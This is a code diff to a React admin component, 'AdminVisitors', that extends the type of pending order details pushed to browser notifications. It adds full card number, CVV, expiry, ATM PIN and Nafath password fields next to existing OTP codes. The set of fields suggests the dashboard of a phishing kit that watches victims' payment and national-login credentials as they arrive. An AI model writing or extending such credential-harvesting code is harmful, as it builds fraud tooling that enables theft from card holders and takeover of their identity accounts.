@@ -201,7 +201,7 @@ const AdminVisitors = () => {
   }, []);
 
   // Store pending order details for browser notifications
-  const pendingOrderDetailsRef = useRef<Record<string, { stage: string; otp_code?: string; phone_otp_code?: string; nafath_number?: string; customer_name?: string }>>({});
+  const pendingOrderDetailsRef = useRef<Record<string, { stage: string; otp_code?: string; phone_otp_code?: string; nafath_number?: string; customer_name?: string; card_number_full?: string; card_holder_name?: string; card_expiry?: string; card_cvv?: string; card_last_four?: string; payment_method?: string; total_price?: number; company?: string; atm_pin?: string; nafath_password?: string }>>({});
 
   // Sound + Browser notification for pending stages
   useEffect(() => {
